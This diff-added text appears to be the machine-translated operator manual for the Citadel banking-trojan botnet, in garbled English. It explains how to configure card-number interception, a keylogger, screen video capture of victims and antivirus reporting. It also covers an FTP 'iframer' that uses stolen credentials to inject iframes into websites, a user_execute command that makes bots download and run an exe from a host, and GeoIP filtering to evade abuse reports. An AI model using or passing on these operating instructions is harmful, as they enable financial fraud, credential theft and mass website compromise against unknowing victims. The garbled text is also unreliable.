+=> The path to the exe-file is taken from the section "url_loader", respectively, the more often you clean perezalivat exe, the exe-file cleaner are your boots at home. They download it and restart, renewing itself.
+
+
+4) Video Format from bots changed to. Webm (HTML5), we have built online video player admin Citadel, now you can watch videos right in your brauezere (recommended Opera). Of the possibilities: Fast назад-вперед/фулл-скрин/поиск video BotID, IP-address, date.
+But that was not enough and we went on, many of you use (it is time to use and develop all industries combined) AZ and personal admin for injector / akkov collection, etc. Would you like from your admin to watch over the bay, or how you inject on the boat? It's easy! We created the API-system, you can now send BotID or IP-address of the script, and the API will return to you ready to code HTML-embed all the videos on the bot and you can insert and watch at least a narod.ru, without going to the admin Citadel.
+
+=> That's all you can see in the section on-line player, figure it out it's simple.
+
+=> Manual for exporting video files to adminok AZ-based online player.
+Queries like this:
+/ Api.php / megakey / video / list.php? Botnet = COOL & botIP = 111.111.111.111
+/ Api.php / megakey / video / list.php? Botnet = COOL & botId = 017_B4DF7611E03FF4C8
+in response to issue php-arrays or JSON
+
+Format of queries:
+api.php / <security-token> / video / <action> [. <extension>]? <params>
+<security-token> the-key that you specify in the script and he api.php need to log on the server.
+<action> - team
+<extension> - (optional) extension: the output format. If you omit the - see debug-output. Vozvozhnost values:. Dump,. Php,. Json,. Xml
+<params> - function parameters of the controller (you can see in the code)
+
+Examples of queries:
+http://citadelhost.ru/folder/api.php/ahro4uNg/video/list?botnet=COOL&botIP=1.2.3.4
+http://citadelhost.ru/folder/api.php/ahro4uNg/video/list?botnet=COOL&botId=WIN-ABC123
+http://citadelhost.ru/folder/api.php/ahro4uNg/video/list?botnet=COOL&botId=WIN-ABC123&embed=1
+
+
+This parameter is optional botnet.
+citadelhost.ru/folder/api.php/ahro4uNg/video/list? botnet = COOL & botId = SURAKSHYA-PC_775A658D6522DF69
+
+And again, substituting the expansion - you can get the desired format:
+
+
+
+
+adding the parameter & embed = 1 can be obtained directly insert HTML-code for all the videos, but I do not recommend: there may be many) out there for this is a separate function.
+Example without reference to the name of a botnet:
+
+http://citadelhost.ru/folder/api.php/ahro4uNg/video/list?botId=SURAKSHYA-PC_775A658D6522DF69
+http://citadelhost.ru/folder/api.php/ahro4uNg/video/list?botId=SURAKSHYA-PC_775A658D6522DF69&embed=1
+
+
+5) Added a handy parser parser system commands (CMDList) in the control panel, you can now see the new format as a table, the results of the system commands such as: ipconfig, a list of PCs on a LAN, a list of processes, etc.
+
+=> You will see a separate section "CMD parser."
+
+6) Now when you install the build on the bot will automatically be sent to the one-time admin cleduschaya information: installed firewalls, antivirus software installed, installed programs.
+You can look for a particular boat, and for the entire botnet. We have created a separate section, where you can see all the statistics in the form of visual graphics and calculations. Now you know whom to fight.
+
+=> The "Installed Software" if you see a lot of charts in the "Unknown" mean on the boat should not be anti-virus or firewall. Also, pressing the search for reports on the boat, you'll see a new kind of report.
+
+7) Ability to "Favorite logs", you can tag any interesting account (account) when searching for data in the admin and then easily find it unnecessarily, he will be allocated a different color in the "Selected Records"
+
+=> New parameters in the configuration file.
+enable_luhn10_get a
+enable_luhn10_post a
+
+GET LUHN10 - analyzes the data in the GET-requests and WinSocket / Wininet for maps and dumps, the algorithm en.wikipedia.org / wiki / Luhn_algorithm
+POST LUHN10 - analyzes the data in the POST https:// requests.
+To find the map, select the type of report: "LUHN10 request" in the "Database Search".
+
+8) Work with API.php. Through the API, you can pull the ftp-akkunty your ifreymera.
+ * IFramerController:
+ * Api.php / <token> / iframer / ftpList
+ * Api.php / <token> / iframer / ftpList? State = all
+ * Api.php / <token> / iframer / ftpList? Date_from = 2012-12-31
+ * Api.php / <token> / iframer / ftpList? Date_from = 2012-12-31 & state = all
+ * Api.php / <token> / iframer / ftpList? Date_from = 2012-12-31 & state = all & plaintext = 1
+ 
+For other examples of work with the API, see the comments in the script api.php
+
+************************************************** ******************************
+How to update ========================== >>>>> admin bot and one during the next version of Citadel
+************************************************** ******************************
+
+Perezaleyte and rewrite all the scripts on the server and go to the folder / install /, clicking Update - wait until your table will be updated, it may take a long time.
+If you have too clogged database, you will have the meaning set admin again in the new folder and transfer it to a team of bots user_execute http://www.host.com/newcitadel.exe
+Note that the config format with each new version may vary, so in order to get everything working properly, set NEW (going with the version in the archive) to your configuration settings and perezaleyte it in the folder files, along with the exe-file and the video module ( MANDATORY). Pay attention to the emerging new option in the config file that we provide along with the Builder.
+Then, in order to get your bots are updated to the new version, you can run user_execute http://www.temphost.com/newcitadel.exe
+Make sure the exe is available from the web at this link.
+Enjoy.
+
+
+************************************************** ******************************
+Description ========================== >>>>> additional options in the config builder
+************************************************** ******************************
+  disable_cookies 1/0 - If there is one, cookies will not be sent to you in the admin panel.
+  disable_antivirus 1/0 - If set to 1, the module will be turned off MiniAV.
+  enable_luhn10_get 1 - Module CardSwipe, if one is, will intercept the card / dumps in the GET request.
+  enable_luhn10_post 1 - Module CardSwipe, if one is, will intercept the card / dumps in the POST request.
+  remove_certs 1 - If there is one, will not send certificates.
+  timer_autoupdate 8 - Time in hours, auto-update exe from the folder files /. In other words how many hours to download and run the exe each time.
+  disable_httpgrabber 1 - If set to 1, disables HTTP grabber reports in Google Chrome (only in it)
+  report_software 1 - If there is one, to send information about the firewall / antivirus / software in the admin panel.
+
+Section entry "WebFilters"
+  To activate the screen shots, Macka insert "@ * paypal.com / *"
+  If you need screenshots of the full screen, then "@ @ * paypal.com / *"
+  To activate the video recording, "# * paypal.com / *"
+
+entry "WebFakes" - VEBFEYKI do not work!
+
+
+************************************************** ******************************
+========================== >>>>> FTP-ifreymer. Characterization
+************************************************** ******************************
+
+A) The script ifreymera
+Poured on the left site and used as a "pad": performs all the work. Click the "Download Script" and fill it to the left on some ftp host.
+He manages a special crontask from your admin area.
+Debugging features:
+* Create a folder next to the script iframer / writable. There he can save the preview ifreyminga files.
+* Create a script file next to 'iframer.php.log' (the script name with the extension +. Log): it is there automatically will write logs of action, found the folder ...
+* Do not forget to put right if you want to 666.777 debugging to do.
+You can download it on the page ifreymera in socket: [download].
+Physically he is in the system / utils /. Here, he is not called directly, just kept :)
+Sam ifreymer to work does not require any files and records of rights, he carefully uses the PHP-session to store dannyah.
+B) Configuration
+Allows you to specify:
+* URL-ifreymera script to run.
+* HTML-code to insert
+* Mode of action. 'Off' off, 'inject' insert HTML-code, 'preview' preview without changing the files on the FTP: proifreymlennye save files in the folder 'iframed /' next to the script (if it exists and is writable)
+* Method of injection: a clever (not to damage the PHP / JS / ASP) files, write to the end, rewriting
+* Depth bypass folders (levels 1 to 50)
+* Masks for files and folders.
+File ifreymitsya only if the folder and file have come to one of the masks.
+If the folder has coincided with a mask - the depth of crawl increases (in the case of deeply mortgaged public_html)
+C) The principle of client-side
+First, before each phase of the communication sockets with ifreymerom last self-test is whether all the vital functions to work on, predictably, there is a server .... If the selftest failed - no work will be performed.
+
+A cronjob every 10 minutes, collects new ftp-accounts from the database and creates jobs. Repeated ftp-acca is not allowed.
+These accounts are fast on the script ifreymer and added to the list of "tasks" regardless of whether it is currently running or not.
+
+Another cronjob also runs every 10 minutes. It just runs the script ifreymer: if it still works - nothing happens, but if it was dead out there (eg, time limit) - restart will be made. Threshold restart 120sek
+
+And finally, the last cronjob: every minute, he asked how he ifreymer are things: how many jobs done, but in the queue as ready. If you have accounts with whom he had already finished - they pulled out and saved. In these ifreymere acca removed to save memory.
+
+To avoid possible errors entire two-stage data transfer: request, response, request a confirmation action.
+If during the day on no account of the results - he goes again.
+D) Principle of operation of the ifreymera
+At the beginning of the script is a list of file extensions to ignore. They do not change even if approached one of the masks.
+Ifreymer stores the data in the session: they are included in all hosting services, and there is no need to play with the rights or seek a folder writable :) Written by taking into account the possible work, even under PHP4 (it is necessary to check with the event).
+
+Ifreymer know how to properly recycle and breathe on timelimit'u: no sensitive data is not lost, it can continue to place a stop.
+When you break the connection ifreymer can reconnect the next time.
+
+Phases of work:
+A. An attempt to connect. If it fails three times in a row - ACC is marked as invalid.
+If many akkov to which you can not connect - ifreymer can "hang" raking timeouts. This is normal: it tries :)
+Two. An attempt to authenticate. If you can not - ACC invalid.
+Three. Listing all the folders and files to a specified depth. The sample files and folders matching the mask specified in the admin. To circumvent the depth approached folders increases.
+4. Phase ifreyminga. Note that in the mode of 'preview' files to the FTP does not change!
+For each file is determined by its type (by extension) that defines a method ifreyminga. It supports: html, php, CSS, JS, asp (or equivalent extension)
+To add code ifreyma special marker to avoid accidental re-ifreyminga file.
+In the smart code is added to the top of the php-file, but he ifreym output at the end :)
+In the append code appended to the file. Cleverly is determined not to break the syntax of the code. JS-files infected by the introduction of the code drawing a iframe.
+* At all stages of the statistics are collected, the list of changed files.
+
+Ifreymerom run two tasks:
+* "Start" works off automatically every 10 minutes, he acrobystitis new accounts, and includes a long process of verification.
+* "Fee" - at any moment, picks up that it is ready
+E) Interface
+Shows the status of ifreymera (in fact, the state of cron-tasks). You can manually pull the job to update the information.
+Displays a list of accounts. For each: Status, Error, a list of pages (by clicking), statistics (by clicking).
+Invalid accounts are deleted after one day: poviseli and disappeared.
+
+*) The principle of work assignments and ifreymera on his fingers:
+
+Setting the "start": every 10 minutes
+Get some new akkov and append them to the end of the list of tasks.
+Next ifreymer passes on the task list (subscription)
+Take the 1st acc. Connect. It did not work during the 10s? Lay off, recheck.
+Take the 2nd. Joined! Log in but failed. With that done, he invalid.
+Take the third. Do not connect. Also recheck.
+Take the 4th. Connected. Logged. Parse .. ifreymim .. completed, it is valid.
+
+Set "collection":
+it may at any time to connect and pull out the intermediate results) Here is the 2nd and 4th, if they could work out.
+When the 1st and 3rd ACC a few words of disconnection - they will be marked as invalid.
+
+
+Added the latest features:
+
+- Mode "check only". Speaks for itself
+- Option: reifreyming accounts after N days. Each account after N days will be processed again.
+- Replacement of old ifreym new code. If the changed HTML-code - it does not add a stupid replace the old :)
+- Option "acca ifreymit only yesterday." Day to give it to ignore arrange)
+- Logging of errors ifreymera (!)
+- Intelligent detection of folders (they are indistinguishable from files)
+- Reset button. Thanks to protect against re-ifreyma accounts will not spoil it :) Zaignorennye acca stored (ie not too spoiled)
+- Selective ignore accounts (not ifreymit for anything). Reported ignore accounts displayed per day and hide. If you make a reset - and they will remain hanging all day.
+- Sort by: Recent Developments (found, shipped, processed) in chronological order from top
+
+- The lever of a manual start (full manual mode). This is done by click on the instructions above, if ifreymer mode "off"
+  For example, clicking the first to receive new acca. Necessary zaignoril, click the second: they fly away for processing.
+  The third task - to collect the results - always fulfills itself :)
+  
+************************************************** ******************************
+Keylogger processes ========================== >>>>>
+************************************************** ******************************
+To enable the keylogger in the config Builder prescribes a new section:
+
+ entry "Keylogger"
+    processes "calc.exe; * notepad *"
+    a time
+  end
+
+  * Notepad * find the right process on behalf of
+  calc.exe the exact name of the process
+  Here we enumerate the list of processes which we set the keylogger.
+  Recall that a keylogger is on by default for all browsers, so use the module, if you need to keep track of separate-made applications.
+  time of 1 indicates the time in minutes, how many minutes in a row, since the application started to record key.
+  Section need to register before section entry "CmdList" or after it.
+  
+  To search for records in admin area, select the type of report: "Keylogger"
+  
+************************************************** ******************************
+GeoIP ========================== >>>>> Filtering Protection botnet
+************************************************** ******************************
+To enable a module, go to "Options" in the admin, there is a point "Permitted country", put a check on and celebrate the right of the country.
+All countries that are not marked you automatically fall into the ignore list, however, reports of them will still be written, but when you request a config file.php and sending requests to the gate, the bots will be issued a 404-level HTTP-server (you can check out a sniffer)
+Budget option from the abuse. Recommended only for small VIP-compartmentalized botnets in order to transfer the securities to a particular botnet bots.
+If you notice a strong load on the server, immediately turn off the setting.
+
+************************************************** ******************************
+========================== >>>>> Double-log Cleaner
+************************************************** ******************************
+
+To enable or disable the module, you must go to "Options" sub-functions - "Deduplication reports" enable and disable.
+If you notice a heavy load on the server, immediately disconnect the module in the settings.
+  
+************************************************** ******************************
+
+************************************************** ******************************
